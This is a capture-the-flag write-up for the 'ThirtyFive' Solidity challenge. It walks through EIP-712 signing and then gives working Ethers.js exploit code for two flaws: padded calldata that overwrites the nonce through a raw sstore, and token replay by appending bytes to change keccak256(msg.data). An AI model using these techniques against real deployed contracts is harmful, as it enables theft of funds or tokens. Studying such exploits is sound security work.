# ThirtyFive

This was a lot of fun to solve. The first thing you need to realize in this puzzle is that it is using the EIP-712: this is a standard for the creation and validation of signatures in smart contracts using structured data. You can read more about it [here](https://eips.ethereum.org/EIPS/eip-712).

## The signature

Following the `signItLikeYouMeanIt` function we can see that it is validating the signature of the structured data called
SIGNING. The structure of this data is revealed through the `SIGNING_TYPEHASH` value, which defines SIGNING to be:

```
        SIGNING(uint16 nonce,uint256 expiry)
```

Thus we need to sign a structured data containing `nonce` and `expiry` with the caller's wallet in order to pass the signature verification check. For this signature, and according to EIP-712, we need to also pass a domain which contains the following data:

```
        domain = {
            name: string,
            version: string,
            chainId: number,
            verifyingContract: address,
        };
```

The data for this fields is in the contract itself, and we can find the clue in this line of the constructor:

```
        DOMAIN_SEPARATOR = keccak256(abi.encode(DOMAIN_TYPEHASH, name_, version_, chainId, address(this)));
```

`name_` and `version_` come from the constructor parameters. `chainId` is the chain ID of the network where the contract is deployed, which is 4 for the Rinkeby network. And finally the address of the ThirtyFive contract itself which is given in the challenge description. For the `name_` and `version_` we can simply look at the bytecode of the deployed contract in Etherscan and extract the constructor parameters from there:

```
        000000000000000000000000000000000000000000000000000000000000000a // String length = 10
        5468697274794669766500000000000000000000000000000000000000000000 // String = "ThirtyFive"
        0000000000000000000000000000000000000000000000000000000000000004 // String length = 4
        3133333700000000000000000000000000000000000000000000000000000000 // String = "1337"
```

So `name_` is "ThirtyFive" (without the quotes) and `version_` is "1337" (without the quotes). Now we can finally create the signature using **Ethers.js** that offers us this functionality:

```
    const domain = {
        name: "ThirtyFive",
        version: "1337",
        chainId: 4,
        verifyingContract: thirtyFiveChallenge.address,
    };

    // The named list of all type definitions
    const types = {
        SIGNING: [
            { name: "nonce", type: "uint16" },
            { name: "expiry", type: "uint256" },
        ],
    };

    // The data to sign
    const value = {
        nonce: nonce,
        expiry: hre.ethers.constants.MaxUint256,
    };

    const signature = await signer._signTypedData(domain, types, value);
```

## The nonce

Now that we have the signature we can call `signItLikeYouMeanIt` and pass the check. However, when we look at `giveMeMyToken` we see that it requires the sent nonce to be:

```
        nonces[msg.sender] > 0x5014C3
```

But the `signItLikeYouMeanIt` function requires:

```
        require(nonce == nonces[msg.sender] + 1, "Invalid Nonce");
```

Meaning we should send `0x5014C3` signatures before we can really access the `giveMeMyToken` function. This, of course, needs to be hacked! And to do so we need to realize a little nasty piece of code in the `signItLikeYouMeanIt` function:

```
        bytes32 slot = keccak256(abi.encode(msg.sender, 0));
        assembly {
            sstore(slot, calldataload(4))
        }
```

What is that doing? The slot calculation is taking the `msg.sender` and the number 0, encoding then and then hashing them. This sounds a lot like the way mappings storage is layed out. In a mapping you take the key value (in this case `msg.sender`) padded to 32 bytes, concatenate it to the original slot position of the mapping and hash it together (check the description [here](https://docs.soliditylang.org/en/v0.8.14/internals/layout_in_storage.html)). In this case the slot 0 is used (from `abi.encode(msg.sender, 0)` and we see that in the contract, the slot 0 is occupied by:

```
        mapping(address => uint24) public nonces;
```

Why this variable and not any of the other that appear before? Because they are constants and immutables that do not occupy storage space. So what those lines of code are doing is effectively storing in `nonces[msg.sender]` the 32 bytes of calldata that are at offset 4.

And what is the calldata? Well, it is what is passed in a transaction in order to call a function in Solidity. In particular the calldata has 4 initial bytes with the function selector, this is, the ID of the function to be called, and then the encoding of the input parameters. One particularity of Solidity is that for data types (like `uint16` or `uint256`) it expects each data type to always be padded to 32 bytes. This means that a `uint16` in reality is occupying 32 bytes of calldata. And why is that important? Whell, we are passing a `uint16` for the `nonce` value, but under the hood it is padded to 32 bytes, and then we are copying those 32 bytes into the `nonces` mapping. What if we could pad the input parameter in a different way to trick the code into thinking that we are passing a nonce of 1, but in reality we would be passing something else?

For example, passing a value of `0x0000000000000000000000000000000000000000000000000000000000FF0001` would trick the code into thinking that we are passing a nonce of 1 because Solidity would take the value as a `uint16` to compare it in the following check:

```
    require(nonce == nonces[msg.sender] + 1, "Invalid Nonce");
```

But then it would go into copying the whole value when copying the calldata here:

```
        bytes32 slot = keccak256(abi.encode(msg.sender, 0));
        assembly {
            sstore(slot, calldataload(4))
        }
```

Because the `nonces` mapping maps the nonce from an address to a `uint24`, the end result would be that `nonces[msg.sender]` would end up having the value `0xFF0001`, which is greater than `0x5014C3` and it would allow us to pass the check in `giveMeMyToken`.

Doing this is trivial with **Ethers.js**, we just need to encode the function call and then modify the required calldata bytes:

```
        // Create custom encoded data
        const signItLikeYouMeanItABI = [
            "function signItLikeYouMeanIt(uint16 nonce, uint256 deadline, bytes memory signature)",
        ];
        const signItLikeYouMeanItIFace = new hre.ethers.utils.Interface(signItLikeYouMeanItABI);

        const encodedData = signItLikeYouMeanItIFace.encodeFunctionData("signItLikeYouMeanIt", [
            nonce,
            value.expiry,
            signature,
        ]);

        // The trick is that the nonce being an uint16 is actually encoded as a uint256. We will take
        // advantage of that to pass a bigger value that will be set into the nonces map
        const fixedEncodedData =
            encodedData.substring(0, 10) +
            "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff" +
            encodedData.substring(70);
```

We end up passing the encoded `nonce` as `0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF0001` and send it with a raw transaction to the challenge contract:

```
        const tx = await signer.sendTransaction({
            to: thirtyFiveChallenge.address,
            data: fixedEncodedData,
        });
        return tx.wait();
```

## The token

The `giveMeMyToken` will emit an event with the generated token. We can read the event to retrieve the token:

```
        const filter = thirtyFiveChallenge.filters.TokenGen(signer.address);
        const events = await hre.ethers.provider.getLogs(filter);
        const token = events[0].topics[2];
```

And finally call the `pwn` function with it to increase our pwn counter to 1! Good job!

## The multi-pwn

However, to really solve the challenge, we need to call `pwn` at least three times. This, however, seems difficult to do because this line in `pwn`:

```
        require(!identifiers[id], "Already executed");
```

prevents us from reusing the same token twice, and this line in `giveMeMyToken`:

```
        if (nonces[msg.sender] > 0x5014C3 && !isTokenGenerated[msg.sender]) {
```

prevents us from generating a second token. Oh, what can we do!!

Let's look again at the `pwn` function. It checks the that passed token is valid, and then it calculates an ID that will be used to check whether the token has already being used. This ID is calculated like this:

```
        bytes32 id = keccak256(msg.data);
```

Where `msg.data` is the calldata of the function. The calldata, as we discussed earlier, is the function selector, plus the parameters, which in this case is the `bytes32` token. Unfortunately it seems that we cannot do much, because if we touch any of the two values the `pwn` function will not work. Or will it? Indeed we cannot touch any of the two values...but nothing prevents us from sending more calldata to the function call, even if it's not going to be used. If we send just 1 extra byte at the end of the calldata, the function call will still work, the token value will be valid, but we will mess the ID generation, thus assining different IDs to the same token value. This is also easy to do in **Ethers.js**:

```
        const pwnABI = ["function pwn(bytes32 token)"];
        const pwnIFace = new hre.ethers.utils.Interface(pwnABI);

        let encodedData = pwnIFace.encodeFunctionData("pwn", [token]);

        if (extraData) {
            encodedData += extraData;
        }
```

Where `extraData` is any extra data we want to include in the calldata. With this, we can call the `pwn` function with the same token by passing an extra data of `0x00`, `0x01` and `0x02` consecutevely. Challenge pwnd!!

## Solution

Solved by deployer: 0xc892cfd3e75Cf428BDD25576e9a42D515697B2C7
Solution Script: [solveThirtyFive.ts](./tasks/solveThirtyFive.ts)

## Auto-solve

To solve this challenge you can use the following command:

```
$ yarn solve-thirtyfive:rinkeby --thirtyfive-address 0xD1970e2E77dCB4Af320284AD72034c6F7F4d5791
```
